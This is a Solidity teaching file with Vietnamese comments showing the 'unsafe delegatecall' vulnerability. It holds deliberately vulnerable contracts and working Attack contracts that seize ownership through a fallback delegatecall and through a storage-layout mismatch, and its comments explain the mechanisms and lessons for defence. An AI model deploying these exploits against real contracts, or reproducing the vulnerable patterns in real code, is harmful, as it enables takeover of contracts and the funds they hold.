// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

// # Bảo mật Sol / Unsafe delegatecall

contract Lib {
    address public owner;
    function pwn() public {
        owner = msg.sender;
    }
}
contract HackMe {
    address public owner;
    Lib public lib;
    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }
    // Vc gọi như này rất nguy hiểm vì bất cứ ai cũng gọi được mọi hàm của contract lib. 
    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}
contract Attack {
    address public hackMe;
    constructor(address _hackMe) {
        hackMe = _hackMe;
    }
    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
// Cơ chế: gọi vào attack -> gọi hàm pwn của HackMe nhưng k tồn tại nên gọi vào fallback -> fallback gọi nó trong contract lib mà contract lib cập nhập own theo msg.sender -> kết quả owner đã bị đổi thành địa chỉ contract attack
// => Kinh nghiệm: khi dùng delegatecall phải biết rõ nó giữ context contract cũ nên khi đổi statevar phải chú ý các state var quan trọng k để cho ai cx đổi đc


contract Lib1 {
    uint public someNumber;
    function doSomething(uint _num) public {
        someNumber = _num;
    }
}
contract HackMe1 {
    address public lib;
    address public owner;
    uint public someNumber;
    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }
    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
        // Or
        // lib.delegatecall(abi.encodeWithSelector(Lib1.doSomething.selector, _num));
    }
}
contract Attack1 {
    address public owner;
    HackMe1 public hackMe;
    // Khi thêm biến khác ta cho nó xuống cuối các biến trùng với contract cũ để tránh lẫn biến
    
    constructor(HackMe1 _hackMe) {
        hackMe = HackMe1(_hackMe);
    }
    function attack() public {
        hackMe.doSomething(uint(uint160(address(this))));
        // Cách cast từ address sang uint là cast thông qua uint160 vì address xài 20byte có 160bits
        hackMe.doSomething(1);
    }
    function doSomething(uint _num) public {
        // Attack -> HackMe -> delegatecall -> đổi state của Attack -> Ở đây msg.sender = Attack vì đó là contract gọi từ lúc đầu tiên
        owner = msg.sender;
    }
}
// Cơ chế: gọi attack của Attack -> hàm lib bị lỗi do thứ tự biến sai nên someNumber ở đây thì cập nhập lại là địa chỉ lib. Do đó ta phải cast nó sang uint khi gọi -> gọi lần 2 thì lib bị đổi và gọi sang attack và thay đổi owner
// => Kinh nghiệm: chú ý biến khai báo phải đúng thứ tự và k được cập nhập địa chỉ của contract gọi delegatecall quan trọng mà ai cũng cập nhập đc